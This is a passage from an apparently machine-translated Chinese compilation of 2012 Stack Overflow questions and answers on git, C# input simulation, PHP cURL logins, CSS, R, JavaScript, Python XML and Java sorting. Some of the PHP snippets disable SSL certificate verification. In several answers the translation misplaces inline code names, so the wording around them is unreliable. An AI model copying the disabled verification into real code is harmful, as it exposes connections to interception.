如果你这样做并且@object 是衬衫，那么**第二个期望将失败**：

```
@object.should be_an_instance_of Shirt
@object.should be_an_instance_of Garment 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-25T04:59:16.927

你的意思是你想检查一个对象是否是一个*类*的实例？如果是这样，那很容易，只需使用`class`：

```
@object.class.should == Shirt 
```

# git - 确定一个分支上的提交而不是另一个

> ID：13548379
> 
> 赞同：3
> 
> 时间：2012-11-25T04:47:29.237
> 
> 标签：git, branching-and-merging

我有一个主题分支，我已经研究了很长一段时间，我想看看对这个分支所做的更改。有一段时间，我做得很好，并定期将主分支合并到我的主题分支中，但最终我忘记了，现在分歧很大。

例如，假设我有这样的历史：

```
         q---r---s---t---u---v---w---x---y---z---my_topic
        ///
---a---b---c---d---e---f---g---h---i---j---k---l-- -m---头
            \ /
             1---2---3（另一个话题）

```

在这种情况下，我只想查看提交 r, s, u, v, x, y, z。我不想看到合并引入的任何更改。但是既然分支从 HEAD 发散了，我不能只看 HEAD 和我的分支的区别。他们分歧到了将它们合并在一起的地步，只是为了看到差异需要做很多工作。

那么有没有办法查看在给定分支上所做的提交，这些提交不是源自另一个分支或与另一个分支合并的结果？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T05:07:19.430

您可以使用以下命令显示在`my_topic`但不在的提交`HEAD`，不包括合并提交：

```
git log --no-merges HEAD..my_topic 
```

您实际上可以`HEAD`省略并只使用`..my_topic`，但两种提交形式更为通用。

# c# - 点击指定客户区

> ID：13548383
> 
> 赞同：0
> 
> 时间：2012-11-25T04:48:13.797
> 
> 标签：c#, click, client, mouse, sendmessage

`Click`不起作用-我不知道为什么也找不到解决方案:(

IE。`Click(150,215)`应该将鼠标移动到客户区域并单击那里。

```
 [DllImport("user32.dll")]
    private static extern bool ScreenToClient(IntPtr hWnd, ref Point lpPoint);

    [DllImport("user32", SetLastError = true)]
    private static extern int SetCursorPos(int x, int y);

    static void MouseMove(int x, int y)
    {
        Point p = new Point(x * -1, y * -1);
        ScreenToClient(hWnd, ref p);
        p = new Point(p.X * -1, p.Y * -1);
        SetCursorPos(p.X, p.Y);
    }

    static void Click(int x, int y)
    {
        MouseMove(x, y);
        SendMessage(hWnd, WM_LBUTTONDOWN, (IntPtr)0x1, new IntPtr(y * 0x10000 + x));
        SendMessage(hWnd, WM_LBUTTONUP, (IntPtr)0x1, new IntPtr(y * 0x10000 + x));
    } 
```

**编辑：** ***以下方法有效，但我会说“更高级”。***

当然我可以使用`mouse_event`它，但我希望看到 SendMessage() 的解决方案......

```
 [DllImport("user32.dll")]
    static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);

    const int LEFTDOWN = 0x00000002;
    const int LEFTUP = 0x00000004;

    static void Click(int x, int y)
    {
        MouseMove(x, y);
        mouse_event((int)(LEFTDOWN), 0, 0, 0, 0);
        mouse_event((int)(LEFTUP), 0, 0, 0, 0);
    } 
```

过了一会儿，我找到了另一种方法`MouseInput`by `SendInput`，但它很长：P

可以缩小吗？

```
 [Flags]
    enum MouseEventFlags : uint
    {
        MOUSEEVENTF_MOVE = 0x0001,
        MOUSEEVENTF_LEFTDOWN = 0x0002,
        MOUSEEVENTF_LEFTUP = 0x0004,
        MOUSEEVENTF_RIGHTDOWN = 0x0008,
        MOUSEEVENTF_RIGHTUP = 0x0010,
        MOUSEEVENTF_MIDDLEDOWN = 0x0020,
        MOUSEEVENTF_MIDDLEUP = 0x0040,
        MOUSEEVENTF_XDOWN = 0x0080,
        MOUSEEVENTF_XUP = 0x0100,
        MOUSEEVENTF_WHEEL = 0x0800,
        MOUSEEVENTF_VIRTUALDESK = 0x4000,
        MOUSEEVENTF_ABSOLUTE = 0x8000
    }

    [DllImport("user32.dll", SetLastError = true)]
    static extern uint SendInput(uint nInputs, ref INPUT pInputs, int cbSize);

    [StructLayout(LayoutKind.Explicit)]
    struct MouseKeybdhardwareInputUnion
    {
        [FieldOffset(0)]
        public MouseInputData mi;
    }
    struct MouseInputData
    {
        public int dx;
        public int dy;
        public uint mouseData;
        public MouseEventFlags dwFlags;
        public uint time;
        public IntPtr dwExtraInfo;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct INPUT
    {
        public SendInputEventType type;
        public MouseKeybdhardwareInputUnion mkhi;
    }
    enum SendInputEventType : int
    {
        InputMouse,
    }

    static void Click(int x, int y)
    {
        INPUT mouseInput = new INPUT();
        mouseInput.type = SendInputEventType.InputMouse;
        mouseInput.mkhi.mi.dx = x;
        mouseInput.mkhi.mi.dy = y;
        mouseInput.mkhi.mi.mouseData = 0;

        MouseMove(x, y);
        mouseInput.mkhi.mi.dwFlags = MouseEventFlags.MOUSEEVENTF_LEFTDOWN;
        SendInput(1, ref mouseInput, Marshal.SizeOf(new INPUT()));

        mouseInput.mkhi.mi.dwFlags = MouseEventFlags.MOUSEEVENTF_LEFTUP;
        SendInput(1, ref mouseInput, Marshal.SizeOf(new INPUT()));
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T05:00:40.580

虽然我没有调查您描述的确切问题，但我建议您查看[`mouse_event`](http://msdn.microsoft.com/en-us/library/aa932376.aspx)哪些[`SendInput`](http://msdn.microsoft.com/en-us/library/ms646310%28VS.85%29.aspx)Windows API 调用旨在执行您描述的操作。

`mouse_event`是旧版本的调用，更新并通过支持多个输入事件来`SendInput`取代。`mouse_input`这两种方法都可以在 P/Invoke.net 上使用，网址如下：

*   `mouse_event`： http: [//pinvoke.net/default.aspx/user32/mouse_event.html](http://pinvoke.net/default.aspx/user32/mouse_event.html)
*   `SendInput`： http: [//pinvoke.net/default.aspx/user32/SendInput.html](http://pinvoke.net/default.aspx/user32/SendInput.html)

# windows-phone-7 - 鉴于缺少服务，在我的 Windows Phone 应用程序中管理数据的最佳方式是什么？

> ID：13548384
> 
> 赞同：0
> 
> 时间：2012-11-25T04:48:17.290
> 
> 标签：windows-phone-7, live-tile, background-agents

我有一些数据用于填充 Windows Phone 应用程序中的文本框，并更新动态磁贴等。

但是，我不得不聘请后台代理来帮助我的应用程序，因为它需要每小时更新一次。

我无法引用父项目，因为这会导致循环引用。我无法复制代码，因为这会引入冗余和搞砸的可能性（令人惊讶的是，当我尝试这样做时，我收到了无法访问的代码检测警告）。

我应该将数据保存在 csv 还是 xml 文件中，如果是，我如何从父应用程序和代理访问它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T05:20:51.390

我相信 Windows Phone 支持 SQLite。使用它来存储您的数据，并将数据访问代码放在您的应用程序和后台代理都使用的单独库中。

# matlab - MATLAB：从点创建多边形并在图中掩盖其区域

> ID：13548388
> 
> 赞同：0
> 
> 时间：2012-11-25T04:49:06.680
> 
> 标签：matlab, octave

我有一个由经度和纬度点组成的海岸线文件。绘制它

```
plot(lat,lon) 
```

将导致点的连接图，从而形成海岸线。

我[在文件交换中使用 gridfit 函数执行 2D 插值](http://www.mathworks.com/matlabcentral/fileexchange/8998-surface-fitting-using-gridfit)

在图形的区域上。![在此处输入图像描述](../Images/fd73b18c72831da08ca0365c264217c6.png)

我的目标是掩盖被海岸线包围的土地并将海洋（面具外）设置为白色。所以看起来我只是在土地上进行了推断。

我认为策略是将海岸线点变成多边形并以某种方式变成面具？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T15:49:49.130

使用 inpolygon 查找多边形外部的点坐标集。用 NaN 代替那些在外面的。

您可能需要确保多边形是闭合多边形，因为看起来您的多边形停止在网格的边缘。这仅仅意味着您需要在绘图的左上角添加该点。

如果您为海岸线所拥有的那组点只是一个分散的点列表，即它们没有按顺序排列，那么您真正的问题是如何将它们变成一个多边形。在这种情况下，我建议使用像[CRUST](http://www.voronoi.com/wiki/index.php?title=Crust_and_Skeleton)这样的工具。

# php - 使用 PHP 在 cURL lib 中的 POST 未发送

> ID：13548392
> 
> 赞同：4
> 
> 时间：2012-11-25T04:49:39.860
> 
> 标签：php, post, curl

我正在尝试使用 PHP 通过 cURL 发送 POSTDATA，但我认为 post 没有发送

```
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLINFO_HEADER_OUT, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_URL, $url);
$t = curl_exec($ch); 
```

不知道为什么，但我试图登录一个页面，当我转储 $t 时，我总是看到表单，curl_error 是空的，我该怎么做才能调试这个？试图登录的页面不是我的！

* * *

我有一个模拟 cURL 的本地表单，它可以：

```
<form action="$url" method="POST">
  <input type="hidden" name="username" value="$uspw" />
  <input type="hidden" name="password" value="$uspw" />
  <input type="submit" value="Send" />
</form> 
```

它登录 $url! 这是我在 cURL 中发送到 POSTFIELDS 的 $data

```
$data = array('username' => $uspw,
              'password' => $uspw); 
```

是的..用户和密码是一样的

* * *

收到的标头：

```
HTTP/1.1 100 Continue

HTTP/1.1 200 OK
Date: Sun, 25 Nov 2012 05:23:19 GMT
Server: Apache
Cache-Control: no-cache="set-cookie"
Content-Length: 4822
Set-Cookie: SESSIONID_portalApp=xxxxxx!-xxx!xxx; path=/
Content-Language: en
X-Powered-By: Servlet/2.4 JSP/2.0
Content-Type: text/html; charset=ISO-8859-1 
```

在此之后，我再次收到所有表格......

* * *

```
$data = array('username' => $uspw,
    'password' => $uspw);

$header = array('Origin: xxx',
        'Content-Type: application/x-www-form-urlencoded',
        'Connection: keep-alive',
        'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3',
        'Cache-Control: max-age=0',
        'Except:',
        'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Charset:ISO-8859-1,utf-8;q=0.7,*;q=0.3',
        'Accept-Encoding:gzip,deflate,sdch',
        'Accept-Language:es-ES,es;q=0.8',
        );

$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLINFO_HEADER_OUT, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_FORBID_REUSE, 0);
curl_setopt($ch, CURLOPT_FRESH_CONNECT, 0);
curl_setopt($ch, CURLOPT_AUTOREFERER, 1);

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
curl_setopt($ch, CURLOPT_COOKIEJAR, 'xxx.txt');
curl_setopt($ch, CURLOPT_REFERER, 'xxxx');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_URL, $url);
$t = curl_exec($ch); 
```

谢谢你！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T09:16:10.513

看起来您正试图在没有浏览器的情况下登录第三方系统。

这很可能不起作用，因为您没有做它期望的事情，即建立会话 cookie。尽管您可能*正确*登录，但远程站点可能会再次向您显示表单，因为您的 cookie 中没有任何内容告诉它在重定向时做其他事情。标题解释了这一点：

> 设置 Cookie：SESSIONID_portalApp=xxxxxx!-xxx!xxx；路径=/

创建一个 cookie 文件供 cURL 使用（使用类似的东西）并使用该指令[`tempnam()`](http://php.net/tempnam)告诉 cURL 它位于何处。`CURLOPT_COOKIEJAR`您也可以从浏览器中获取现有的 cookie 并尝试，作为排除故障的另一种方法。

在初始化 cURL 之前添加：

```
$cookieFile = tempnam('/dev/shm', 'curlCookie_'); 
```

然后告诉 cURL 使用它：

```
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile); 
```

我建议`/dev/shm`是因为它在重新启动后就消失了，您可以在任何有能力的地方创建它。只需在不再需要时小心删除它们。您还可以更改前缀以使单个文件更容易与单个请求（时间戳、PID 等）关联，便于调试。

还要确保将用户代理字符串设置为远程站点可以接受的内容。请记住，它需要一个浏览器——所以你必须确保你的行为像一个浏览器。正如评论中所建议的，设置`CURLOPT_FOLLOWLOCATION`true 可能是一个好主意。

如果这不起作用，请在浏览器中正常执行该操作并仔细查看页面。可能需要 JS 才能正确构建会话 .. 在这一点上，仅使用 cURL 就有点不走运了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T13:28:54.493

访问表单页面，然后使用*相同*的 curl 资源进行发布请求。此外，添加以下设置：

```
curl_setopt($ch, CURLOPT_FORBID_REUSE, 0);
curl_setopt($ch, CURLOPT_FRESH_CONNECT, 0);
curl_setopt($ch, CURLOPT_AUTOREFERER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "valid user agent"); 
```

# css - 侧边栏不会向右浮动 wordpress

> ID：13548393
> 
> 赞同：0
> 
> 时间：2012-11-25T04:49:55.903
> 
> 标签：css, wordpress, floating

我使用 emptycanvas 作为 wordpress 的起点。我已将 .wrapper 设置为 80% 宽度，最大宽度为：1250px；

存放内容/侧边栏的Container设置为宽度100%，内容没有设置宽度，设置为float:left；没有其他选项，侧边栏设置为 350px；with float:right....由于某种原因它拒绝浮动并且总是低于内容！如果我在内容上设置例如 500px 的宽度，一切都会到位......我认为如果没有指定的宽度，它会自动调整到漂浮在它周围的项目......那么我在这里做错了什么？

不幸的是，这是在本地服务器上，所以我无法显示确切的代码，但这里没有任何额外的东西我没有告诉你..

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T06:38:13.957

您需要纠正两个问题才能使您的布局按预期工作（请参阅下面我刚刚根据您的描述创建的代码）

1.  您需要指定内容 div 的宽度。否则，div 的宽度将由其中内容的宽度决定。这不能为您提供可管理的布局。

2.  两个浮动 DIV 不能包含在容器 div 中（您可以通过为容器、内容和侧边栏 div 提供不同的背景来检查这一点，如下所示）这是因为，非浮动分区不能只包含浮动内容，默认情况下显示设置（div 的默认显示属性是块）。要解决这个问题，需要将容器的显示属性改为table。在容器内包含内容和侧边栏的另一种方法是再添加一个非浮动 div 并将其从浮动对象中清除（清除：两者）。

    的HTML

    ```
    <body>

        <div id="wrapper">
            <div id="container">
                    <div id="content">
                         <h1> I am inside content. what will happen if I increase the content in here? </h1>
                    </div><!--End of content-->
                    <div id="sidebar">
                          <h1> I am inside the side bar </h1>
                    </div><!--End of sidebar-->
            </div><!--End of container-->

        </div><!--End of wrapper-->

    </body> 
    ```

CSS

```
#wrapper{
margin:0 auto;
width:80%;
max-width:1250px;
}
#container{
width:100%;
background:red;
display:table; /*This is necessary to wrap the two floated contents inside. The other way of achieving same result is to add some non-floated div and set to clear floated contents*/
}
#content{
float: left;
background:green;
}
#sidebar{
width:350px;
float: right;
background:blue;
} 
```

# r - 强制关闭已打开的文件进行复制

> ID：13548396
> 
> 赞同：2
> 
> 时间：2012-11-25T04:50:14.873
> 
> 标签：r, file, io, copy

我需要复制一个文件。

说，我有这个代码：

```
outputFile <- 'Path1/out.pdf'
originFile <- 'Path2/origin.pdf'

file.copy(from =originFile, to = outputFile,overwrite=TRUE) 
```

但是，如果 out.pdf（目标文件）已经打开，我有一个**权限被拒绝**异常。

如何在新副本之前强制关闭/删除目标文件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T09:24:09.553

在这种情况下，使用 close 或类似的东西没有帮助，因为您没有句柄可以`out.pdf`打开，例如在 Acrobat Reader 中。

有两种方法可以解决这个问题（假设是 Windows，我不知道如何在其他系统中处理这个问题）。

a) 使用 Sumatra Viewer；它是唯一一个不会锁定 pdf 文件的相当可靠的查看器。这是 RStudio 使用的方法。

b)`pdfpos`通过 system() 调用使用来关闭文件。有关示例，请参见[此处。](http://dererumnatura.us/archives/2006/03/texniccenter-an.html)在 RStudio 出现之前，我使用了这种方法，但它需要在 Acrobat Reader/Full Version 的每个新版本上进行调整，并运行 perl 安装。应该在其他操作系统上工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T08:44:47.770

看看`?close`- 这些是在 R 中管理文件连接的命令。`close(outputFile)`可能就是你所需要的。`closeAllConnections()`如果您同时打开多个文件，则核弹很多。

（当然，如果文件已被 R 之外的另一个程序打开，例如 pdf 阅读器，您将不得不在 R 之外关闭它。）

# url - ExpressionEngine 安全破解程序将频道条目选择项 entry_id 附加到 URL

> ID：13548402
> 
> 赞同：0
> 
> 时间：2012-11-25T04:50:58.513
> 
> 标签：url, append, expressionengine, safecracker

我想将 entry_id 来自选择框（嵌入）附加到安全破解器 URL

这是代码：

```
{exp:safecracker channel="blending_log"  return="sthome/blending/ENTRY_ID" dynamic_title="     [selected_tea]_[organic_or_conventional][date_time][agent_number]"}
<h3>Select and enter data</h3>
{embed="stembeds/.blending_select_tea"}

{!--------Receive data to create value--------}
<input type="hidden" name="title" value="" />
<br /><br />
Organic Or Conventional:
 {field:org_con}

 Agent Number:
 {field:agent_number}

{!-----END Receive data to create lot number-------} 
```

这是嵌入：

```
<select name="selected_tea">
<option selected="selected" >Select a Tea</option>
{exp:channel:entries channel="tea_herbs" order_by="title" sort="asc"}

<option name={title} id={entry_id} value={url_title}>{title}</option>

{/exp:channel:entries} 

</select> 
```

在嵌入第 4 行我有 id="{entry_id}

```
<option name={title} id={entry_id} value={url_title}>{title}</option> 
```

我想获取条目 ID 并将其附加到 safecracker 的 URL，如下所示：

```
{exp:safecracker channel="blending_log"  return="sthome/blending/ENTRY_ID/entry_id" dynamic_title="     [selected_tea]_[organic_or_conventional][date_time][agent_number]"} 
```

因为我想在下一页使用 entry_id**使用 {last_segment} 检索tea_herbs 频道中的一些数据**

这可能吗 ？

我阅读了 safecracker 的文档并尝试了 entry_id = "{segment_....}" 但它没有用。可能是我使用 entry_id = "{segment_....}" 错误的方式。

请帮我完成这个任务

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T14:04:30.917

在您的 SafeCracker 标记中，`ENTRY_ID`将替换为新条目的实际条目 ID。所以只需使用`return="sthome/blending/ENTRY_ID`. 这会将您重定向到**sthome/blending/45**（例如）。

然后，`entry_id="{segment_3}"`在您的**sthome/blending**模板中使用 - 尽管如果您在该页面上使用标准频道条目或 Safecracker 标记，它应该自动读取条目 ID（因为它是第三个部分）。

# javascript - 如何在一个页面中包含网站的多个部分

> ID：13548407
> 
> 赞同：-1
> 
> 时间：2012-11-25T04:51:54.287
> 
> 标签：javascript, html, css

我想制作一个有多个页面的网站，但由于导航栏独特，我不能简单地链接到每个页面的新文件。实现这一目标的最佳方法是什么。我能想到的一些可能性是将它们全部放在一个页面上，但使用 css 和 javascript 将其他页面移出屏幕，或者使用 iframe 并使用 javascript 加载它们。有人可以指导我一些示例或教程吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T04:56:20.543

我认为您最好的选择是使用 iframe。

将每个 iframe 的 src 设置为要在小 div 中显示的页面。

这应该这样做

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T05:40:47.617

使用 jQuery 加载从导航中单击的页面。只需有一个包含分隔符 ( `<div>`)，页面将加载到该分隔符中。

这将加载页面而无需重新加载。

IFF（不是拼写错误，它的意思是“如果且仅当”）您想要支持未启用 Javascript 的浏览器，请使用 iFrame，但随后在您的 javascript 中将其从浏览器中删除，因为使用 iFrame 是非常糟糕的做法。

```
<script>
$(document).ready(function(){
 $("iframe").remove();
 $("body").append("<div id='page_container'></div>");
 $("#navigation_bar a").click(function(e){
  e.preventDefault();
  $("#page_container").load("http://www.example.com/"+this.attr("href"));
 });
});
</script> 
```

HTML 看起来像：

```
<body>
 <nav>
  <a href="link1.html" target="frame">Link1</a>
  <a href="link2.html" target="frame">Link2</a>
 </nav>
 <iframe src="link1.html" name="frame"></iframe>
</body> 
```

未经测试，但概念应该有效（http://jsfiddle.net/Ns2Gx/）

# python - python minidom xml解析

> ID：13548408
> 
> 赞同：1
> 
> 时间：2012-11-25T04:52:17.503
> 
> 标签：python, xml, minidom

我试图找到一种在使用 minidom 解析 xml 文件时获取索引号的方法。xml 看起来像这样

```
<stuff>
    <morestuff>
        <sometag>catagory1</sometag>
        <path pathversion="1">/path Im looking to for</path> #<--info i'm after
        <path pathversion="2">/path I don't need</path>
        <path pathversion="3">/path I don't need</path>
    </morestuff>
    <morestuff>
        <sometag>catagory2</sometag>
        <path pathversion="1">/other path I'm looking for</path> #<--info i'm after
        <path pathversion="2">/path I don't need</path>
        <path pathversion="3">/path I don't need</path>
    </morestuff>
</stuff> 
```

我想做这样的事情

```
for element in node.getElementsByTagName('sometag'):
    if element.firstChild.data == 'catagory1':
        elementid = element.indexnumber #<----how do I write the [0], or [1] to a variable so I can use it to discribe the position in the next line
        var1 = node.getElementsByTagName('path')[elementid].firstChild.data
    if element.firstChild.data == 'catagory2':
        elementid = element.indexnumber
        var2 = node.getElementsByTagName('path')[elementid].firstChild.data 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T11:07:45.663

像 Keith 建议的那样使用 etree 怎么样：-

```
['/path Im looking to for', "/other path I'm looking for"] 
```

使用此代码：-

```
import xml.etree.ElementTree as ET
tree = ET.fromstring('''<stuff>
    <morestuff>
        <sometag>catagory1</sometag>
        <path pathversion="1">/path Im looking to for</path>
        <path pathversion="2">/path I don't need</path>
        <path pathversion="3">/path I don't need</path>
    </morestuff>
    <morestuff>
        <sometag>catagory2</sometag>
        <path pathversion="1">/other path I'm looking for</path>
        <path pathversion="2">/path I don't need</path>
        <path pathversion="3">/path I don't need</path>
    </morestuff>
</stuff>
''')
print [e.text for e in tree.findall('.//morestuff/path[@pathversion="1"]')] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T10:42:03.453

这将创建一个包含您想要的信息的字典：

```
import xml.dom.minidom
doc = xml.dom.minidom.parseString(test)

paths = {}

for element in doc.getElementsByTagName('morestuff'):
    # get the text value of the sometag tag
    category = element.getElementsByTagName('sometag')[0].firstChild.nodeValue

    # get all the paths which are children of the morestuff element
    for path in element.getElementsByTagName('path'):
        if path.getAttribute('pathversion') == '1':
            pathstr = path.firstChild.nodeValue
            paths[category] = pathstr

print paths 
```

我得到的输出是：

```
{u'catagory1': u'/path Im looking to for', u'catagory2': u"/other path I'm looking for"} 
```

# java - 测试 String 令牌的内容

> ID：13548409
> 
> 赞同：0
> 
> 时间：2012-11-25T04:52:54.720
> 
> 标签：java

我正在制作一个计算器，该程序的一部分接受用户`String`输入并将其标记化（使用我自己的`Tokenizer`类实现）。所以现在我有一堆`Token`对象，我想测试它们中的每一个，看看它们是否包含数字或运算符。

有没有一种方法可以测试它们是否包含运算符（即 +、-、*、/、=、(、) 等）而不使用
`if (token.equals("+") || token.equals("-") || ...`等，对于每个运算符？这些`Token`对象都是 type `String`。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-25T04:58:18.657

如果它们都是单字符串，你可以这样做：

```
if ("+-*/=()".indexOf(token) > -1) {

    // if you get into this block then token is one of the operators.

} 
```

您也可以使用数组来保存指示相应标记优先级的值：

```
int precedence[] = { 2, 2, 3, 3, 1, 4, 4 };  // I think this is correct

int index = "+-*/=()".indexOf(token); 
if (index > -1) {

    // if you get into this block then token is one of the operators.
    // and its relative precedence is precedence[index]

} 
```

但是由于这一切都假设操作员只有一个字符，所以这是您可以采用这种方法的最大程度。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T05:22:52.730

您也可以为此使用 String contains。

```
 String operators = "+-*/=()";
String token ="+";

if(operators.contains(token)){

    System.out.println("here");
} 
```

# java - Java中的这个反向站点地址命名系统是什么？

> ID：13548410
> 
> 赞同：0
> 
> 时间：2012-11-25T04:53:50.460
> 
> 标签：java, package

Like`com.google.appengine.codelab.Util` [是一个类](http://googcloudlabs.appspot.com/codelabexercise1.html)，但为什么它看起来像某种反向域名？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T04:56:21.657

这是 Java 的包命名约定。请参阅[文档](http://docs.oracle.com/javase/tutorial/java/package/namingpkgs.html)。

# java - 让我的 EventListeners 触发我的 @ElementCollection 属性有什么技巧？

> ID：13548411
> 
> 赞同：10
> 
> 时间：2012-11-25T04:54:02.777
> 
> 标签：java, spring, hibernate, jpa-2.0

我已经开始处理我的 JPA 事件（postUpdate），当我更新实体上的属性时，它们会正确触发，但映射为 @ElementCollection 的属性除外。

这是限制吗？配置选项？

这是我实体的一部分

```
@Entity
@Inheritance(strategy = InheritanceType.JOINED)
public class Pckg {
    @Id @GeneratedValue(strategy = GenerationType.AUTO)
    private Long id;

    @Column(nullable = false, length = 100)
    private String title;

    @ElementCollection
    @CollectionTable (
        name = "PckDest",
        joinColumns = @JoinColumn(name = "package_id", nullable = false)
    )
    @Column(name = "destination", nullable = false, length = 150) 
    private List<String> destinations;
    ... 
```

换句话说，如果我更改“标题”，我的听众会捕捉到更改，但是当我更改“目的地”时不会发生同样的情况

我通过 Spring（3.1）使用 JPA 和休眠（4.0）作为提供者

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-05T04:06:19.113

最后我们解决了这个添加乐观锁的问题`@Version`，它强制休眠写入主父表并调用我们的侦听器。

在任何情况下，这仍然无法按照应有的方式工作，但最重要的是，乐观锁定也没有什么坏处

谢谢

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-29T07:56:37.040

所有者端没有更新（Pck 表），更新的是保存收集数据的表（PckDest）。

我认为甚至可以说更改集合的内容可以被视为更新，因为它可以并且通常会被实现为删除和插入。

我认为您必须在实体管理生命周期之外处理此类行为，或者在所有者实体内部拥有某种字段，该字段会在列表更改时更新（例如某种校验和），以便在您更改列表时也是父实体必须更新（虽然我不知道这是否是个好主意）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-05T08:15:59.530

也许这个链接可以帮助你：

[使用休眠 4.0 和 spring 3.1.0.release 的事件监听器？](https://stackoverflow.com/questions/8616146/eventlisteners-using-hibernate-4-0-with-spring-3-1-0-release)

看起来 Hibernate 4 和注册 EntityListeners 有一些变化。

# javascript - 之内 滚动到给定字符串的第一次出现

> ID：13548412
> 
> 赞同：3
> 
> 时间：2012-11-25T04:54:11.263
> 
> 标签：javascript, jquery, scroll

在我的 div 标签中，有很多行非常长的文本，并且 div 元素当前是可滚动的。我想做的是找到特定字符串的第一次出现并自动滚动到包含该字符串的行。没有换行符或任何类型的字符串分隔符，我可以使用它来轻松近似滚动位置。

我想我可以做这样的事情：

```
var max_chars_per_line = approximated max # of chars that can fit into one line;
var font_height = approximated font height in px;
var needle = string to look for;
var haystack = content in the <div> tag;
var index = haystack.indexOf(needle);
var num_lines_to_skip = index / max_chars_per_line;
my_div_tag.scrollTo(num_lines_to_skip * font_height); 
```

我不禁想知道是否有更好的（javascript/jQuery）解决方案。我自己的尽职调查没有发现任何问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T05:20:09.067

如果您的所有文本都在一个 div 中，则类似此解决方案的方法有效。

```
var goto = function(str){

    var content = $('#content').html();
    $('#content').html( content.replace(str,'<a name="goto">'+str+'</a>') );
    window.location = '#goto';
}

goto('Whatever your string is here'); 
```

[http://jsfiddle.net/NmhHH/](http://jsfiddle.net/NmhHH/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T05:20:22.170

```
<p id="text">Lorem ipsum ... lots of text.... onion</p> 
```

问：

```
var needle = 'onion';
$('#text').html($('#text').html().replace(needle, '<a id="imhere"></a>'+needle));
$('html,body').animate({scrollTop: $('#imhere').offset().top​}, 500);​​​​​​​​​​​​ 
```

演示[http://jsfiddle.net/vq7LD/](http://jsfiddle.net/vq7LD/)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-25T05:18:49.940

你不能做一些类似于使用以下 Java 类型代码的事情吗：

```
 var lineToTest = getLine(textArray);

  if(lineToTest.contains(testingLine){
   lineIndex = getLineNumber(textArray-1); //since it already accessed the line it'll have to access the next and subtract 1\. } 
```

然后只需使用任何突出显示技术来突出显示该行。您显然必须创建您的 getLine、getLineNumber 函数。除非那里有一些很酷的 jQuery 函数（可能就是这种情况）。

# java - 如何根据一个属性对对象数组列表进行排序？

> ID：13548413
> 
> 赞同：1
> 
> 时间：2012-11-25T04:54:26.970
> 
> 标签：java, sorting, object, arraylist

我有一个学生对象的arrayList。这些对象都有共同的属性，例如名字和姓氏，UID（大学ID号）GPA，然后还有研究生和本科的子类。对于如何根据 UID 号按从低到高的顺序对数组列表进行排序，我一直很困惑。UID 号是 U123456 格式的 STRING。总是有一个 U，然后是不同数量的整数。由于 U，我无法解析为 int 并以这种方式排序，我已经看到`Comparator`正在使用的类，但我不明白，因为它似乎只比较两个对象？！如果该`Comparator`课程适用于此，有人可以向我解释它的作用和工作原理吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T05:25:06.907

由于这种行为，很容易比较：

```
System.out.println("u1".compareTo("u2")); // -1
System.out.println("u2".compareTo("u2")); // 0
System.out.println("u3".compareTo("u2")); // 1
System.out.println("u4".compareTo("u2")); // 2 
```

所以这就是你需要做的：

*   让`Student implement Comparable`...你可以看看[http://docs.oracle.com/javase/6/docs/api/java/lang/Comparable.html](http://docs.oracle.com/javase/6/docs/api/java/lang/Comparable.html)
*   在学生中定义`compareTo(Student s)`，这只是`return(this.id.compareTo(s.id));`
*   只需使用 ArrayList 调用 sort()

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T06:33:25.580

